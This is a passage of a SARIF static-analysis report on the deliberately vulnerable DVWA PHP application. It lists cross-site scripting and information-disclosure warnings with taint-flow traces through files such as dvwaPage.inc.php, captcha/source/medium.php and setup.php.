                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_POST['password_new']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $pass_new"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4730",
      "message" : {
        "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F0A175304EB918A0B9C8ABB2FBCCB798"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:602 - get_current_user(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 602
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:602 - get_current_user(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 602
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:602 - Assignment to $DVWAUploadsWrite"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 602
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:3 - dvwaPage.inc.php({$DVWAUploadsWrite})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:4 - dvwaPage.inc.php(once)({$DVWAUploadsWrite})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:46 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 46
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:107 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 107
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4731",
      "message" : {
        "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F0A175304EB918A0B9C8ABB2FBCCB799"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:603 - get_current_user(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 603
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:603 - get_current_user(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 603
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:603 - Assignment to $bakWritable"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 603
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:3 - dvwaPage.inc.php({$bakWritable})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:4 - dvwaPage.inc.php(once)({$bakWritable})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:46 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 46
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:107 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 107
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4732",
      "message" : {
        "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F0A175304EB918A0B9C8ABB2FBCCB79A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:604 - get_current_user(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 604
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:604 - get_current_user(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 604
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:604 - Assignment to $DVWAPHPWrite"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 604
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:3 - dvwaPage.inc.php({$DVWAPHPWrite})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:4 - dvwaPage.inc.php(once)({$DVWAPHPWrite})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:46 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 46
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:107 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 107
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4757",
      "message" : {
        "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to builtin_echo() on line 345. The information revealed by builtin_echo() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "FC57DD8C54341B1F5D9EBA7F8BD81FEE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:607 - Read $_SERVER['SERVER_NAME']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 607
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:607 - Read $_SERVER['SERVER_NAME']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 607
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:607 - Assignment to $SERVER_NAME"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 607
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:3 - dvwaPage.inc.php({$SERVER_NAME})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:4 - dvwaPage.inc.php(once)({$SERVER_NAME})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 4
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:46 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 46
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "setup.php:107 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "setup.php"
                },
                "region" : {
                  "startLine" : 107
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4594",
      "message" : {
        "text" : "Line 355 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "92EF27D624CB8D818985777A959AAAD7"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 355,
            "endLine" : 355,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:142 - Read $_COOKIE['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 142
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:355 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 355
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:142 - Read $_COOKIE['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 142
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:142 - Return"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 142
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:456 - dvwasecuritylevelget(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 456
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:456 - Assignment to $security"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 456
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:458 - Return"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 458
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:301 - dvwabuttonhelphtmlget(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 301
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:301 - Assignment to $systemInfoHtml"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 301
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:355 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 355
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:142 - Read $_COOKIE['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 142
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:355 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 355
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:142 - Read $_COOKIE['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 142
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:142 - Return"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 142
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:463 - dvwasecuritylevelget(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 463
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:463 - Assignment to $security"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 463
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:464 - Return"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 464
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:298 - dvwabuttonsourcehtmlget(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 298
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:298 - Assignment to $systemInfoHtml"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 298
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:355 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 355
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4457",
      "message" : {
        "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "3E768A1E5391AB41F00609EA37388328"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 435,
            "endLine" : 435,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Read $_GET['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Read $_GET['security']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:13 - Assignment to $security"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:72 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "view_source.php:95 - dvwasourcehtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/view_source.php"
                },
                "region" : {
                  "startLine" : 95
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:435 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 435
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4483",
      "message" : {
        "text" : "Line 435 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "537198DA98652DCF4B42BD84465F1CE6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 435,
            "endLine" : 435,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
